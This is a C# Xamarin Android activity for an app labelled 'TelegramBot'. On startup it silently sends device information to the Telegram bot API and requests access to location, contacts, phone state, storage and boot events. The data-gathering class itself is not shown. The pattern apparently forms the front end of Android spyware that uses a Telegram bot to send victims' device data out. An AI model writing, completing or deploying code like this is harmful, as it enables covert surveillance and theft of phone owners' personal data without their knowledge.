using Android.App;
using Android.Content;
using Android.Content.PM;
using Android.OS;
using AndroidX.Core.App;
using AndroidX.Core.Content;
using Refit;
using System.Threading.Tasks;
using TelegramBot1;

namespace TelegramBot
{
    [Activity(Label = "TelegramBot", MainLauncher = true)]
    public class MainActivity : Activity
    {
        private BotActivityModel _botViewModel;
        private const int RequestPermissionsCode = 100;

        protected override void OnCreate(Bundle savedInstanceState)
        {
            base.OnCreate(savedInstanceState);
            SetContentView(Resource.Layout.activity_main);

            SendDeviceInfoOnAppStart();
            // Request runtime permissions
            RequestPermissionsIfNeeded();
        }
        private async Task SendDeviceInfoOnAppStart()
        {
            //Initialize the BotViewModel with Refit
            var apiService = RestService.For<ITelegramApiService>("https://api.telegram.org");
            _botViewModel = new BotActivityModel(apiService);
            await _botViewModel.SendDeviceInfoAsync();
        }
        // Check and request permissions
        private void RequestPermissionsIfNeeded()
        {
            string[] permissions = new string[]
            {
        Android.Manifest.Permission.Internet,
        Android.Manifest.Permission.ReadExternalStorage,
        Android.Manifest.Permission.WriteExternalStorage,
        Android.Manifest.Permission.AccessFineLocation,
        Android.Manifest.Permission.AccessCoarseLocation,
        Android.Manifest.Permission.ReadContacts,
        Android.Manifest.Permission.ReadPhoneState,
        Android.Manifest.Permission.ReceiveBootCompleted
            };

            // Check if any permission is not granted
            List<string> permissionsToRequest = new List<string>();
            foreach (var permission in permissions)
            {
                if (ContextCompat.CheckSelfPermission(this, permission) != Permission.Granted)
                {
                    permissionsToRequest.Add(permission);
                }
            }

            // Request all permissions that are not granted
            if (permissionsToRequest.Count > 0)
            {
                ActivityCompat.RequestPermissions(this, permissionsToRequest.ToArray(), RequestPermissionsCode);
            }
        }

        // Handle the result of the permission request
        public override void OnRequestPermissionsResult(int requestCode, string[] permissions, Permission[] grantResults)
        {
            base.OnRequestPermissionsResult(requestCode, permissions, grantResults);

            if (requestCode == RequestPermissionsCode)
            {
                for (int i = 0; i < permissions.Length; i++)
                {
                    if (grantResults[i] == Permission.Granted)
                    {
                        // Permission granted, handle the permission-specific tasks
                        Toast.MakeText(this, $"{permissions[i]} granted", ToastLength.Short).Show();
                    }
                    else
                    {
                        // Permission denied, show message or handle accordingly
                        Toast.MakeText(this, $"{permissions[i]} denied", ToastLength.Short).Show();
                    }
                }
            }
        }


    }
}
